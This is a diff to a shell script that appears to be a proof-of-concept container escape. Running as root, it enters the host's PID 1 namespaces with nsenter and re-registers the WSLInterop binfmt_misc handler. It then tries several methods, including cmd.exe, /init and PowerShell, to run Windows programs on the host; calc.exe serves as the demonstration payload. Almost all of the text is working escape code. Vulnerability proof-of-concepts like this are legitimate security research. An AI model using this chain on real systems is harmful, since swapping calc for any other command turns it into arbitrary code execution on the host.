@@ -102,23 +102,38 @@ if [ -f /host/mnt/c/Windows/System32/cmd.exe ] || grep -qi microsoft /host/proc/
   else
     echo "[!] no WSL_INTEROP in host procs — interop launch may still no-op"
   fi
-  # runwin <interpreter> [args...] — enter host mount/pid ns with interop restored.
-  # cwd forced onto a drvfs path so cmd.exe does not bail on a UNC working dir.
+  # binfmt_misc: kernel needs WSLInterop entry to exec PE binaries via /init.
+  # Inside nsenter context it may be missing — re-register if so (we are root).
+  echo "[*] checking binfmt_misc WSLInterop in host namespace ..."
+  nsenter -t 1 -m -u -i -n -p -- sh -c "
+    if [ ! -d /proc/sys/fs/binfmt_misc ]; then
+      mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc 2>/dev/null
+    fi
+    if [ -f /proc/sys/fs/binfmt_misc/WSLInterop ]; then
+      echo \"[*] WSLInterop already registered\"
+      head -2 /proc/sys/fs/binfmt_misc/WSLInterop
+    else
+      echo \"[*] WSLInterop missing — registering\"
+      echo :WSLInterop:M::MZ::/init: > /proc/sys/fs/binfmt_misc/register 2>/dev/null \
+        && echo \"[+] registered\" || echo \"[!] register failed\"
+    fi
+  "
+
+  # runwin: enter host ns with WSL_INTEROP restored.
   runwin() { nsenter -t 1 -m -u -i -n -p -- env WSL_INTEROP="$interop" "$@"; }
 
-  # Method A: cmd.exe start calc
-  runwin /bin/sh -c "cd /mnt/c && exec /mnt/c/Windows/System32/cmd.exe /c start calc" 2>/dev/null \
-    && echo "[+] calc launched (cmd.exe start)" && exit 0
-  # Method B: powershell Start-Process
+  # Method A: cmd.exe via binfmt_misc (kernel routes MZ -> /init -> Windows)
+  runwin /mnt/c/Windows/System32/cmd.exe /c start calc 2>/dev/null \
+    && echo "[+] calc launched (cmd.exe via binfmt)" && exit 0
+  # Method B: /init as explicit PE interpreter (bypasses binfmt entirely)
+  runwin /init /mnt/c/Windows/System32/cmd.exe /c start calc 2>/dev/null \
+    && echo "[+] calc launched (cmd.exe via /init)" && exit 0
+  # Method C: powershell
   runwin /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -NoProfile -Command "Start-Process calc" 2>/dev/null \
     && echo "[+] calc launched (powershell)" && exit 0
-  # Method C: direct Win32 calc launcher stub
-  runwin /mnt/c/Windows/System32/calc.exe 2>/dev/null \
-    && echo "[+] calc launched (calc.exe)" && exit 0
-  # Method D: write a bat and run it via cmd
-  echo "calc" > /host/mnt/c/Users/Public/huddle-poc.bat
-  runwin /mnt/c/Windows/System32/cmd.exe /c "C:\\Users\\Public\\huddle-poc.bat" 2>/dev/null \
-    && echo "[+] calc launched (bat)" && exit 0
+  # Method D: /init + powershell
+  runwin /init /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -NoProfile -Command "Start-Process calc" 2>/dev/null \
+    && echo "[+] calc launched (powershell via /init)" && exit 0
   echo "[!] all WSL2 calc methods failed — check proof file instead: $P"
 else
   echo "[*] native Linux — launching calc via nsenter"
